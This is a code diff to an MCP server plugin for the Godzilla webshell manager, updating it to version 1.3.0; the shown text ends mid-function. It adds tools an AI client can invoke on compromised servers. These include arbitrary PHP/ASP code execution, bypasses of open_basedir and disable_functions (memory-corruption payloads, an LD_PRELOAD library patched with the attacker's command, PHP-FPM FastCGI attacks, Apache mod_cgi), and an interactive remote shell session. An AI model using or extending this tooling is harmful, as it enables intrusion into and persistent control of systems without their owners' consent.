@@ -56,13 +56,15 @@ public class GodzillaMcpServerPlugin implements Plugin {
 
     // 核心：无状态载荷连接池，支持 AI 并发控制多台靶机
     private static final ConcurrentHashMap<String, Payload> payloadCache = new ConcurrentHashMap<>();
+    // v1.3.0: 会话凭据缓存（url -> {password, secretKey, payload, cryption}），缓存失效时无需数据库即可原位重建
+    private static final ConcurrentHashMap<String, String[]> sessionCreds = new ConcurrentHashMap<>();
     // === 全局状态 ===
     private static boolean isServerRunning = false;
     private static HttpServer mcpServer = null;
 
     private static final String PROTOCOL_VERSION = "2024-11-05";
     private static final String SERVER_NAME = "godzilla-mcp";
-    private static final String SERVER_VERSION = "1.2.2";
+    private static final String SERVER_VERSION = "1.3.0";
     private static final SimpleDateFormat LOG_DATE_FMT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
     private static PrintWriter logWriter = null;
 
@@ -682,7 +684,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
                     strProp("targetUrl", "目标 Webshell 的 URL")
             }, new String[][]{ strProp("savePath", "本地保存路径（可选，不填则返回 base64）") })));
 
-            tools.add(buildToolDef("exec_code", "在目标执行 PHP 代码（仅 PhpDynamicPayload；要求目标 output_buffering>0，发行版 PHP 默认满足）", buildSchemaEx(new String[][]{
+            tools.add(buildToolDef("exec_code", "在目标执行代码（PHP / ASP 载荷；PHP 要求目标 output_buffering>0，发行版 PHP 默认满足）", buildSchemaEx(new String[][]{
                     strProp("targetUrl", "目标 Webshell 的 URL"), strProp("code", "PHP 代码（不含 <?php）")
             }, null)));
 
@@ -754,10 +756,42 @@ public class GodzillaMcpServerPlugin implements Plugin {
             tools.add(buildToolDef("filter_shell_remove", "移除目标应用中的 Filter 内存马", buildSchemaEx(new String[][]{
                     strProp("targetUrl", "目标 Webshell 的 URL"), strProp("filterName", "filter 名称")
             }, null)));
-            tools.add(buildToolDef("zip", "在目标上压缩/解压 ZIP", buildSchemaEx(new String[][]{
+            tools.add(buildToolDef("zip", "在目标上压缩/解压 ZIP（Java / PHP 载荷自动适配）", buildSchemaEx(new String[][]{
                     strProp("targetUrl", "目标 Webshell 的 URL"), strProp("action", "zip=压缩 / unzip=解压"),
                     strProp("src", "源路径（压缩=目录，解压=zip文件）"), strProp("dest", "目标路径（压缩=zip路径，解压=目录）")
             }, null)));
+            tools.add(buildToolDef("php_ps", "列出目标进程（PHP 载荷专属：直接解析 /proc，不依赖系统命令，disable_functions 禁用命令函数时依然可用）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, null)));
+            tools.add(buildToolDef("php_webshell_scan", "扫描目标上的 Webshell 特征（PHP 载荷专属：正则匹配 PHP/INC 文件中的可疑代码，返回 file/line/code 列表）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, new String[][]{
+                    strProp("scanPath", "扫描目录（可选，默认目标当前目录）")
+            })));
+            tools.add(buildToolDef("php_bypass_open_basedir", "绕过 open_basedir 限制（PHP 载荷专属：写入会话标志，后续文件操作自动解除 open_basedir 限制）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, null)));
+            tools.add(buildToolDef("php_bypass_disable_functions", "绕过 disable_functions 执行命令（PHP 载荷专属）。mode=mem 内存绕过 / env LD_PRELOAD / fpm 攻击 PHP-FPM / amc Apache Mod CGI", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("mode", "mem / env / fpm / amc（默认 mem）"), strProp("cmd", "要执行的命令（默认 whoami）")
+            }, new String[][]{
+                    strProp("payload", "mem 模式 payload 名（默认 php-filter-bypass）。Linux 可选: php-filter-bypass/disfunpoc/php-json-bypass/php7-backtrace-bypass/php7-gc-bypass/php7-SplDoublyLinkedList-uaf/procfs_bypass/php74-FFI-BUG/php5-imap_open/php7-FFI/PHP74-FFI-Serializable"),
+                    strProp("tempPath", "临时文件目录（可选，默认目标当前目录）"),
+                    strProp("fpmAddress", "fpm 模式的 FPM 地址，如 127.0.0.1:9000 或 unix:///run/php-fpm.sock")
+            })));
+            tools.add(buildToolDef("php_attack_fpm", "通过 FastCGI 攻击 PHP-FPM 执行任意代码（PHP 载荷专属）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("fpmAddress", "FPM 地址，如 127.0.0.1:9000 或 unix:///run/php-fpm.sock"),
+                    strProp("scriptFile", "FPM 服务器上的脚本路径，如 /var/www/html/index.php"), strProp("code", "要执行的 PHP 代码（不含 <?php）")
+            }, null)));
+            tools.add(buildToolDef("real_cmd", "虚拟终端-交互式命令执行（PHP/Java 载荷）。action=start 开启会话返回 sessionId；action=write 发送输入（输出随响应返回）；action=read 轮询输出；action=stop 结束；action=list 列出会话", buildSchemaEx(new String[][]{
+                    strProp("action", "start / write / read / stop / list")
+            }, new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL（start 必填）"),
+                    strProp("cmd", "start: 终端程序（默认 /bin/sh；Windows 为 cmd.exe）"),
+                    strProp("sessionId", "write/read/stop: 会话 ID"),
+                    strProp("data", "write: 要发送的数据，如 \"ls -la\\n\""),
+                    strProp("timeoutMs", "read: 等待输出的毫秒数（默认 2000）"),
+                    strProp("sleepMs", "start: 建立会话的等待毫秒数（默认 1500）")
+            })));
             result.add("tools", tools);
             return result;
         }
@@ -908,6 +942,12 @@ public class GodzillaMcpServerPlugin implements Plugin {
                 case "filter_shell_list": resultText = filterShellListTool(arguments); break;
                 case "filter_shell_remove": resultText = filterShellRemoveTool(arguments); break;
                 case "zip": resultText = zipTool(arguments); break;
+                case "php_ps": resultText = phpPsTool(arguments); break;
+                case "php_webshell_scan": resultText = phpWebshellScanTool(arguments); break;
+                case "php_bypass_open_basedir": resultText = phpBypassOpenBasedirTool(arguments); break;
+                case "php_bypass_disable_functions": resultText = phpBypassDisableFunctionsTool(arguments); break;
+                case "php_attack_fpm": resultText = phpAttackFpmTool(arguments); break;
+                case "real_cmd": resultText = realCmdTool(arguments); break;
                 default:
                     throw new Exception("Unknown tool: " + toolName);
             }
@@ -1093,6 +1133,11 @@ public class GodzillaMcpServerPlugin implements Plugin {
             newShell.setEncoding("UTF-8");
 
             if (Db.addShell(newShell) > 0) {
+                sessionCreds.put(newShell.getUrl(), new String[]{
+                        params.get("password").getAsString(),
+                        params.get("secretKey").getAsString(),
+                        params.get("payload").getAsString(),
+                        params.get("cryption").getAsString()});
                 if (!Boolean.getBoolean("godzilla.mcp.headless")) {
                 SwingUtilities.invokeLater(() -> MainActivity.getFrame().refreshShellView());
             }
@@ -1262,7 +1307,20 @@ public class GodzillaMcpServerPlugin implements Plugin {
         } catch (Exception first) {
             log("[MCP] 首次执行失败，清缓存重试: " + McpHandler.stringifyError(first));
             payloadCache.remove(url);
-            return op.run(getOrInitPayload(url));
+            try {
+                return op.run(getOrInitPayload(url));
+            } catch (Exception second) {
+                log("[MCP] 重试仍失败: " + McpHandler.stringifyError(second));
+                if (second.getMessage() != null && second.getMessage().startsWith("Shell URL not found in database")) {
+                    throw first;
+                }
+                String msg = second.getMessage();
+                if (msg != null && msg.contains("sendHttpResponse") && msg.contains("null")) {
+                    throw new Exception("目标无响应或连接中断（目标可能崩溃、超时或网络不通），已重试仍失败", first);
+                }
+                second.addSuppressed(first);
+                throw second;
+            }
         }
     }
 
@@ -1329,6 +1387,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
         e.setEncoding("UTF-8");
         if (!e.initShellOpertion()) throw new Exception("连接失败：请检查 URL / 密码 / 密钥 / Payload / 加密方式");
         payloadCache.put(url, e.getPayloadModule());
+        sessionCreds.put(url, new String[]{password, secretKey, payloadType, cryption});
         StringBuilder sb = new StringBuilder();
         sb.append("✓ 连接成功\nURL: ").append(url).append("\nPayload: ").append(payloadType).append("\nCryption: ").append(cryption);
         if (save) {
@@ -1343,9 +1402,12 @@ public class GodzillaMcpServerPlugin implements Plugin {
         if (url == null || url.isEmpty()) {
             int n = payloadCache.size();
             payloadCache.clear();
+            sessionCreds.clear();
             return "✓ 已断开全部会话（" + n + " 个）";
         }
-        return payloadCache.remove(url) != null ? "✓ 已断开: " + url : "未找到会话: " + url;
+        boolean removed = payloadCache.remove(url) != null;
+        sessionCreds.remove(url);
+        return removed ? "✓ 已断开: " + url : "未找到会话: " + url;
     }
 
     private String listSessions() {
@@ -1461,15 +1523,24 @@ public class GodzillaMcpServerPlugin implements Plugin {
     private String execCodeTool(JsonObject a) throws Exception {
         final String code = requireParam(a, "code");
         return onTarget(a, p -> {
-            if (!p.getClass().getName().contains("Php")) {
-                throw new Exception("exec_code 仅支持 PHP 载荷（当前: " + p.getClass().getName() + "）");
+            final String lang = payloadLang(p);
+            if ("php".equals(lang)) {
+                if (!p.include("PHP_Eval_Code", readResBytes("/shells/plugins/php/assets/evalCode.php"))) {
+                    throw new Exception("PHP_Eval_Code 插件加载失败");
+                }
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("plugin_eval_code", code);
+                return new String(p.evalFunc("PHP_Eval_Code", "xxx", rp), StandardCharsets.UTF_8);
             }
-            if (!p.include("PHP_Eval_Code", readResBytes("/shells/plugins/php/assets/evalCode.php"))) {
-                throw new Exception("PHP_Eval_Code 插件加载失败");
+            if ("asp".equals(lang)) {
+                if (!p.include("AEvalCode", readResBytes("/shells/plugins/asp/assets/evalCode.asp"))) {
+                    throw new Exception("AEvalCode 插件加载失败（需要目标为 ASP 环境）");
+                }
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("plugin_eval_code", code);
+                return new String(p.evalFunc("AEvalCode", "xxx", rp), StandardCharsets.UTF_8);
             }
-            util.http.ReqParameter rp = new util.http.ReqParameter();
-            rp.add("plugin_eval_code", code);
-            return new String(p.evalFunc("PHP_Eval_Code", "xxx", rp), StandardCharsets.UTF_8);
+            throw new Exception("exec_code 当前支持 PHP / ASP 载荷（当前: " + p.getClass().getSimpleName() + "）");
         });
     }
 
@@ -1613,8 +1684,19 @@ public class GodzillaMcpServerPlugin implements Plugin {
         final String host = requireParam(a, "target");
         final String ports = normalizePorts(requireParam(a, "ports"));
         return onTarget(a, p -> {
-            final String className = "plugin.JPortScan";
-            if (!p.include(className, readResBytes("/shells/plugins/java/assets/JPortScan.classs"))) {
+            final String lang = payloadLang(p);
+            final String className;
+            final String assetPath;
+            if ("php".equals(lang)) {
+                className = "PortScan";
+                assetPath = "/shells/plugins/php/assets/PortScan.php";
+            } else if ("java".equals(lang)) {
+                className = "plugin.JPortScan";
+                assetPath = "/shells/plugins/java/assets/JPortScan.classs";
+            } else {
+                throw new Exception("port_scan 当前支持 Java / PHP 载荷（当前: " + p.getClass().getSimpleName() + "）");
+            }
+            if (!p.include(className, readResBytes(assetPath))) {
                 throw new Exception("端口扫描插件加载失败");
             }
             util.http.ReqParameter rp = new util.http.ReqParameter();
@@ -1732,25 +1814,466 @@ public class GodzillaMcpServerPlugin implements Plugin {
         final String src = requireParam(a, "src");
         final String dest = requireParam(a, "dest");
         return onTarget(a, p -> {
-            if (!p.include("JZip", readResBytes("/shells/plugins/java/assets/JZip.classs"))) {
-                throw new Exception("JZip 插件加载失败");
+            final String lang = payloadLang(p);
+            final String className;
+            final String assetPath;
+            if ("php".equals(lang)) {
+                className = "PZip";
+                assetPath = "/shells/plugins/php/assets/PZip.php";
+            } else if ("java".equals(lang)) {
+                className = "JZip";
+                assetPath = "/shells/plugins/java/assets/JZip.classs";
+            } else {
+                throw new Exception("zip 当前支持 Java / PHP 载荷（当前: " + p.getClass().getSimpleName() + "）");
+            }
+            if (!p.include(className, readResBytes(assetPath))) {
+                throw new Exception(className + " 插件加载失败");
             }
             util.http.ReqParameter rp = new util.http.ReqParameter();
             if ("unzip".equalsIgnoreCase(action)) {
                 rp.add("compressFile", src);
                 rp.add("compressDir", dest);
-                return new String(p.evalFunc("JZip", "unZip", rp), StandardCharsets.UTF_8);
+                return new String(p.evalFunc(className, "unZip", rp), StandardCharsets.UTF_8);
             }
             rp.add("compressFile", dest);
             rp.add("compressDir", src);
-            return new String(p.evalFunc("JZip", "zip", rp), StandardCharsets.UTF_8);
+            return new String(p.evalFunc(className, "zip", rp), StandardCharsets.UTF_8);
         });
+    }
+
+    // ===================== v1.3.0 语言专属工具实现 =====================
+
+    /** 探测载荷语言：php / asp / csharp / java */
+    private static String payloadLang(Payload p) {
+        String n = p.getClass().getName().toLowerCase();
+        if (n.contains("php")) return "php";
+        if (n.contains("cshap") || n.contains("csharp")) return "csharp";
+        if (n.contains("asp")) return "asp";
+        return "java";
+    }
+
+    private static void requirePhp(Payload p, String tool) throws Exception {
+        if (!"php".equals(payloadLang(p))) {
+            throw new Exception(tool + " 仅支持 PHP 载荷（当前: " + p.getClass().getSimpleName() + "）");
+        }
+    }
+
+    /** 通过 PHP_Eval_Code 机制执行内置 PHP 资产代码（与哥斯拉对应客户端插件调用序列一致） */
+    private String phpEvalAsset(Payload p, String code, util.http.ReqParameter rp) throws Exception {
+        if (!p.include("PHP_Eval_Code", readResBytes("/shells/plugins/php/assets/evalCode.php"))) {
+            throw new Exception("PHP_Eval_Code 插件加载失败");
+        }
+        rp.add("plugin_eval_code", code);
+        return new String(p.evalFunc("PHP_Eval_Code", "xxx", rp), StandardCharsets.UTF_8);
+    }
+
+    private static String b64d(String s) {
+        try {
+            return new String(Base64.getDecoder().decode(s.trim()), StandardCharsets.UTF_8);
+        } catch (Exception e) {
+            return s;
+        }
+    }
+
+    /** php_ps：免命令进程列表（解析 /proc，仅 Linux） */
+    private String phpPsTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> {
+            requirePhp(p, "php_ps");
+            if (p.isWindows()) throw new Exception("php_ps 仅支持 Linux 目标");
+            if (!p.include("Ps", readResBytes("/shells/plugins/php/assets/Ps.php"))) {
+                throw new Exception("Ps 插件加载失败");
+            }
+            String raw = new String(p.evalFunc("Ps", "run", new util.http.ReqParameter()), StandardCharsets.UTF_8);
+            StringBuilder sb = new StringBuilder();
+            for (String line : raw.split("\n")) {
+                line = line.replace("\r", "");
+                if (line.trim().isEmpty()) continue;
+                String[] cols = line.split("\t");
+                if (cols.length >= 7 && !"UID".equals(cols[0].trim())) {
+                    cols[6] = b64d(cols[6]);
+                }
+                sb.append(String.join("\t", cols)).append("\n");
+            }
+            return sb.length() == 0 ? raw : sb.toString();
+        });
+    }
+
+    /** php_webshell_scan：Webshell 特征扫描 */
+    private String phpWebshellScanTool(JsonObject a) throws Exception {
+        final String scanPath = optString(a, "scanPath", "");
+        return onTarget(a, p -> {
+            requirePhp(p, "php_webshell_scan");
+            if (!p.include("WebShellScan", readResBytes("/shells/plugins/php/assets/WebShellScan.php"))) {
+                throw new Exception("WebShellScan 插件加载失败");
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("scanPath", scanPath);
+            String raw = new String(p.evalFunc("WebShellScan", "run", rp), StandardCharsets.UTF_8);
+            JsonArray arr = new JsonArray();
+            for (String line : raw.split("\n")) {
+                String[] cols = line.split("\t");
+                if (cols.length < 3) continue;
+                JsonObject o = new JsonObject();
+                o.addProperty("file", b64d(cols[0]));
+                o.addProperty("line", b64d(cols[1]));
+                o.addProperty("code", b64d(cols[2]));
+                arr.add(o);
+            }
+            if (arr.size() == 0) return "未发现可疑 Webshell 特征（扫描路径: " + (scanPath.isEmpty() ? "." : scanPath) + "）";
+            return arr.toString();
+        });
+    }
+
+    /** php_bypass_open_basedir */
+    private String phpBypassOpenBasedirTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> {
+            requirePhp(p, "php_bypass_open_basedir");
+            if (!p.include("plugin.ByPassOpenBasedir", readResBytes("/shells/plugins/php/assets/ByPassOpenBasedir.php"))) {
+                throw new Exception("ByPassOpenBasedir 插件加载失败");
+            }
+            String res = new String(p.evalFunc("plugin.ByPassOpenBasedir", "run", new util.http.ReqParameter()), StandardCharsets.UTF_8);
+            return res + "\n(bypass_open_basedir 标志已写入会话，后续文件操作自动绕过 open_basedir)";
+        });
+    }
+
+    private static final String[] PHP_MEM_PAYLOADS_LINUX = {"php-filter-bypass", "disfunpoc", "php-json-bypass", "php7-backtrace-bypass", "php7-gc-bypass", "php7-SplDoublyLinkedList-uaf", "procfs_bypass", "php74-FFI-BUG", "php5-imap_open", "php7-FFI", "PHP74-FFI-Serializable"};
+    private static final String[] PHP_MEM_PAYLOADS_WINDOWS = {"php-filter-bypass", "php-com"};
+
+    /** php_bypass_disable_functions：mem / env / fpm / amc 四种绕过方式 */
+    private String phpBypassDisableFunctionsTool(JsonObject a) throws Exception {
+        final String mode = optString(a, "mode", "mem");
+        final String cmd = optString(a, "cmd", "whoami");
+        final String tempPathOpt = optString(a, "tempPath", null);
+        final String fpmAddress = optString(a, "fpmAddress", null);
+        final String targetUrl = requireParam(a, "targetUrl");
+        return onTarget(a, p -> {
+            requirePhp(p, "php_bypass_disable_functions");
+            boolean win = p.isWindows();
+            if ("mem".equals(mode)) {
+                String payloadName = optString(a, "payload", "php-filter-bypass");
+                String[] list = win ? PHP_MEM_PAYLOADS_WINDOWS : PHP_MEM_PAYLOADS_LINUX;
+                boolean known = false;
+                for (String s : list) if (s.equals(payloadName)) { known = true; break; }
+                if (!known) {
+                    throw new Exception("不支持的 mem payload: " + payloadName + "（可用: " + java.util.Arrays.toString(list) + "）");
+                }
+                String code = new String(readResBytes("/shells/plugins/php/assets/" + payloadName + ".php"), StandardCharsets.UTF_8);
+                String execCmd = cmd;
+                String resultFile = null;
+                if ("php-filter-bypass".equals(payloadName)) {
+                    resultFile = util.functions.formatDir(tempPathOpt != null ? tempPathOpt : p.currentDir()) + "." + util.functions.md5(java.util.UUID.randomUUID().toString());
+                    execCmd = cmd + " > " + resultFile;
+                }
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("cmd", execCmd);
+                String out = phpEvalAsset(p, code, rp);
+                if (resultFile != null) {
+                    byte[] data = p.downloadFile(resultFile);
+                    p.deleteFile(resultFile);
+                    if (data != null && data.length > 0) out = new String(data, StandardCharsets.UTF_8);
+                }
+                return out;
+            }
+            if ("env".equals(mode) || "fpm".equals(mode)) {
+                if (win) throw new Exception(mode + " 模式仅支持 Linux 目标");
+                String tempDir = util.functions.formatDir(tempPathOpt != null ? tempPathOpt : p.currentDir());
+                String cmdFile = tempDir + "." + util.functions.md5(java.util.UUID.randomUUID().toString());
+                String resultFile = tempDir + "." + util.functions.md5(java.util.UUID.randomUUID().toString());
+                String soFile = tempDir + "." + util.functions.md5(java.util.UUID.randomUUID().toString());
+                byte[] so = buildAntSo(p, "bash " + cmdFile + " > " + resultFile);
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("soFile", soFile);
+                rp.add("cmdFile", cmdFile);
+                rp.add("resultFile", resultFile);
+                rp.add("so", so);
+                rp.add("cmd", cmd);
+                String assetName;
+                if ("fpm".equals(mode)) {
+                    if (fpmAddress == null || fpmAddress.trim().isEmpty()) {
+                        throw new Exception("fpm 模式需要 fpmAddress，如 127.0.0.1:9000 或 unix:///run/php-fpm.sock");
+                    }
+                    String fa = fpmAddress.trim();
+                    String host;
+                    String port = "-1";
+                    if (fa.startsWith("unix")) {
+                        host = fa;
+                    } else if (fa.startsWith("/")) {
+                        host = "unix://" + fa;
+                    } else {
+                        String[] hp = fa.split(":", 2);
+                        if (hp.length != 2) throw new Exception("fpmAddress 格式应为 host:port 或 unix:///path/to.sock");
+                        host = hp[0];
+                        port = hp[1];
+                    }
+                    rp.add("fpm_host", host);
+                    rp.add("fpm_port", port);
+                    assetName = "FPM.php";
+                } else {
+                    assetName = "LD_PRELOAD.php";
+                }
+                String code = new String(readResBytes("/shells/plugins/php/assets/" + assetName), StandardCharsets.UTF_8);
+                return phpEvalAsset(p, code, rp);
+            }
+            if ("amc".equals(mode)) {
+                String shellUrl = targetUrl;
+                int li = shellUrl.lastIndexOf("/");
+                if (li != -1) shellUrl = shellUrl.substring(0, li + 1);
+                String code = new String(readResBytes("/shells/plugins/php/assets/Apache_mod_cgi.php"), StandardCharsets.UTF_8);
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("shellurl", shellUrl);
+                rp.add("cmd", cmd);
+                return phpEvalAsset(p, code, rp);
+            }
+            throw new Exception("未知 mode: " + mode + "（可选 mem/env/fpm/amc）");
+        });
+    }
+
+    /** 生成 ant LD_PRELOAD 载荷（命令嵌入通用 so/dll 模板，偏移与哥斯拉客户端一致） */
+    private byte[] buildAntSo(Payload p, String cmd) throws Exception {
+        int bits = 86;
+        String suffix = "so";
+        try { bits = p.isX64() ? 64 : 86; } catch (Throwable ignore) {}
+        try { suffix = p.isWindows() ? "dll" : "so"; } catch (Throwable ignore) {}
+        int[] range;
+        if (bits == 86 && "so".equals(suffix)) {
+            range = new int[]{275, 504};
+        } else if (bits == 64 && "so".equals(suffix)) {
+            range = new int[]{434, 665};
+        } else if (bits == 86 && "dll".equals(suffix)) {
+            range = new int[]{1544, 1683};
+        } else {
+            range = new int[]{1552, 1691};
+        }
+        byte[] so = readResBytes("/shells/plugins/php/assets/ant_x" + bits + "." + suffix);
+        byte[] cmdBytes = cmd.getBytes(StandardCharsets.UTF_8);
+        int space = range[1] - range[0];
+        if (cmdBytes.length > space) {
+            throw new Exception("命令长度超过 ant 载荷模板上限（" + space + " 字节）");
+        }
+        byte[] patched = so.clone();
+        System.arraycopy(cmdBytes, 0, patched, range[0], cmdBytes.length);
+        for (int i = range[0] + cmdBytes.length; i < range[1]; i++) patched[i] = 32;
+        patched[range[1]] = 0;
+        return patched;
+    }
+
+    /** php_attack_fpm：FastCGI 直打 PHP-FPM */
+    private String phpAttackFpmTool(JsonObject a) throws Exception {
+        final String fpmAddress = requireParam(a, "fpmAddress");
+        final String scriptFile = requireParam(a, "scriptFile");
+        final String code = requireParam(a, "code");
+        return onTarget(a, p -> {
+            requirePhp(p, "php_attack_fpm");
+            String fa = fpmAddress.trim();
+            String host;
+            String port = "-1";
+            if (fa.startsWith("unix")) {
+                host = fa;
+            } else if (fa.startsWith("/")) {
+                host = "unix://" + fa;
+            } else {
+                String[] hp = fa.split(":", 2);
+                if (hp.length != 2) throw new Exception("fpmAddress 格式应为 host:port 或 unix:///path/to/sock");
+                host = hp[0];
+                port = hp[1];
+            }
+            // 与官方 PAttackFPM 客户端一致：include 后 evalFunc("AttackFPM","run")（其代码为 return 型）
+            if (!p.include("AttackFPM", readResBytes("/shells/plugins/php/assets/AttackFPM.php"))) {
+                throw new Exception("AttackFPM 插件加载失败");
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("evalCode", code);
+            rp.add("scriptFile", scriptFile);
+            rp.add("fpm_host", host);
+            rp.add("fpm_port", port);
+            return new String(p.evalFunc("AttackFPM", "run", rp), StandardCharsets.UTF_8);
+        });
+    }
+
+    // ---------- real_cmd 虚拟终端会话（PHP / Java） ----------
+    private static final ConcurrentHashMap<String, RealCmdSession> realCmdSessions = new ConcurrentHashMap<>();
+
+    private static final class RealCmdSession {
+        final String url;
+        final String className;
+        volatile boolean terminated = false;
+        volatile String startResponse = null;
+
+        RealCmdSession(String url, String className) {
+            this.url = url;
+            this.className = className;
+        }
+    }
+
+    private String realCmdTool(JsonObject a) throws Exception {
+        final String action = requireParam(a, "action");
+        if ("start".equals(action)) {
+            final String url = requireParam(a, "targetUrl");
+            final Payload p = getOrInitPayload(url);
+            final String lang = payloadLang(p);
+            final String className;
+            final String assetPath;
+            if ("php".equals(lang)) {
+                className = "plugin.RealCmd";
+                assetPath = "/shells/plugins/php/assets/realCmd.php";
+            } else if ("java".equals(lang)) {
+                className = "plugin.RealCmd";
+                assetPath = "/shells/plugins/java/assets/RealCmd.classs";
+            } else {
+                throw new Exception("real_cmd 当前支持 PHP / Java 载荷（当前: " + p.getClass().getSimpleName() + "）");
+            }
+            if (!p.include(className, readResBytes(assetPath))) {
+                throw new Exception("RealCmd 插件加载失败");
+            }
+            final String cmdLine = optString(a, "cmd", p.isWindows() ? "cmd.exe" : "/bin/sh");
+            final int sleepMs = Math.max(300, optInt(a, "sleepMs", 1500));
+            final util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("action", "start");
+            rp.add("cmdLine", cmdLine.getBytes(StandardCharsets.UTF_8));
+            String[] splitArgs = util.functions.SplitArgs(cmdLine);
+            for (int i = 0; i < splitArgs.length; i++) {
+                rp.add("arg-" + i, splitArgs[i].getBytes(StandardCharsets.UTF_8));
+            }
+            rp.add("argsCount", String.valueOf(splitArgs.length));
+            String[] exeArgs = util.functions.SplitArgs(cmdLine, 1, false);
+            if (exeArgs.length > 0) {
+                rp.add("executableFile", exeArgs[0].getBytes(StandardCharsets.UTF_8));
+                if (exeArgs.length >= 2) {
+                    rp.add("executableArgs", exeArgs[1].getBytes(StandardCharsets.UTF_8));
+                }
+            }
+            final String sid = java.util.UUID.randomUUID().toString().replace("-", "").substring(0, 12);
+            final RealCmdSession session = new RealCmdSession(url, className);
+            Thread t = new Thread(() -> {
+                try {
+                    byte[] res = p.evalFunc(className, "realCmd", rp);
+                    session.startResponse = res == null ? "" : new String(res, StandardCharsets.UTF_8).trim();
+                } catch (Throwable e) {
+                    session.startResponse = "start error: " + McpHandler.stringifyError(e);
+                }
+            });
+            t.setDaemon(true);
+            t.start();
+            realCmdSessions.put(sid, session);
+            Thread.sleep(sleepMs);
+            String sr = session.startResponse;
+            if (sr != null && sr.length() > 0 && !"ok".equals(sr) && !sr.contains("dead")) {
+                realCmdSessions.remove(sid);
+                return "✗ real_cmd 启动异常: " + sr;
+            }
+            return "✓ real_cmd 会话已建立\nsessionId: " + sid + "\ncmdLine: " + cmdLine
+                    + "\n用法: write 发送命令（data 建议带结尾换行），read 拉取输出，stop 结束会话";
+        }
+        if ("write".equals(action)) {
+            final String sid = requireParam(a, "sessionId");
+            final String data = requireParam(a, "data");
+            RealCmdSession s = realCmdSessions.get(sid);
+            if (s == null) throw new Exception("未知 sessionId: " + sid + "（可用 real_cmd action=list 查看）");
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("action", "processWriteData");
+            rp.add("processWriteData", data.getBytes(StandardCharsets.UTF_8));
+            synchronized (s) {
+                byte[] res = getOrInitPayload(s.url).evalFunc(s.className, "realCmd", rp);
+                String out = decodeRealCmdResult(res);
+                if (out.contains("The process is dead")) {
+                    s.terminated = true;
+                    realCmdSessions.remove(sid);
+                }
+                return "sessionId: " + sid + "\n" + (out.isEmpty() ? "(无输出)" : out) + (s.terminated ? "\n[会话已结束]" : "");
+            }
+        }
+        if ("read".equals(action)) {
+            final String sid = requireParam(a, "sessionId");
+            final int timeoutMs = Math.max(200, optInt(a, "timeoutMs", 2000));
+            RealCmdSession s = realCmdSessions.get(sid);
+            if (s == null) throw new Exception("未知 sessionId: " + sid + "（可用 real_cmd action=list 查看）");
+            long deadline = System.currentTimeMillis() + timeoutMs;
+            StringBuilder out = new StringBuilder();
+            while (System.currentTimeMillis() < deadline) {
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("action", "getResult");
+                byte[] res;
+                synchronized (s) {
+                    res = getOrInitPayload(s.url).evalFunc(s.className, "realCmd", rp);
+                }
+                String chunk = decodeRealCmdResult(res);
+                if (chunk.contains("The process is dead")) {
+                    s.terminated = true;
+                    String cleaned = chunk.replace("The process is dead", "");
+                    if (!cleaned.isEmpty()) out.append(cleaned);
+                    break;
+                }
+                if (!chunk.isEmpty()) {
+                    out.append(chunk);
+                    break;
+                }
+                Thread.sleep(250);
+            }
+            if (s.terminated) realCmdSessions.remove(sid);
+            return "sessionId: " + sid + "\n" + (out.length() == 0 ? "(无新输出)" : out.toString()) + (s.terminated ? "\n[会话已结束]" : "");
+        }
+        if ("stop".equals(action)) {
+            final String sid = requireParam(a, "sessionId");
+            RealCmdSession s = realCmdSessions.get(sid);
+            if (s == null) throw new Exception("未知 sessionId: " + sid + "（可用 real_cmd action=list 查看）");
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("action", "stop");
+            String out;
+            synchronized (s) {
+                byte[] res = getOrInitPayload(s.url).evalFunc(s.className, "realCmd", rp);
+                out = res == null ? "" : new String(res, StandardCharsets.UTF_8).trim();
+            }
+            realCmdSessions.remove(sid);
+            return "✓ real_cmd 已停止 (sessionId: " + sid + ")" + (out.isEmpty() || "ok".equals(out) ? "" : " " + out);
+        }
+        if ("list".equals(action)) {
+            if (realCmdSessions.isEmpty()) return "(无 real_cmd 会话)";
+            StringBuilder sb = new StringBuilder();
+            for (String k : realCmdSessions.keySet()) {
+                RealCmdSession s = realCmdSessions.get(k);
+                sb.append(k).append("  ").append(s.url).append(s.terminated ? "  [已结束]" : "  [运行中]").append("\n");
+            }
+            return sb.toString();
+        }
+        throw new Exception("未知 action: " + action + "（可选 start/write/read/stop/list）");
+    }
+
+    private static String decodeRealCmdResult(byte[] res) {
+        if (res == null || res.length == 0) return "";
+        if (res[0] == 5) return new String(res, 1, res.length - 1, StandardCharsets.UTF_8);
+        return new String(res, StandardCharsets.UTF_8);
     }
 
     private Payload getOrInitPayload(String url) throws Exception {
             if (payloadCache.containsKey(url)) {
                 log("[MCP] 使用缓存 Payload: " + url);
                 return payloadCache.get(url);
+            }
+
+            // v1.3.0: 无数据库依赖的会话凭据原位重建（用于重试/缓存失效场景）
+            String[] cred = sessionCreds.get(url);
+            if (cred != null) {
+                log("[MCP] 缓存缺失，使用会话凭据重建 Payload: " + url);
+                try {
+                    ShellEntity rebuilt = new ShellEntity();
+                    rebuilt.setUrl(url);
+                    rebuilt.setPassword(cred[0]);
+                    rebuilt.setSecretKey(cred[1]);
+                    rebuilt.setPayload(cred[2]);
+                    rebuilt.setCryption(cred[3]);
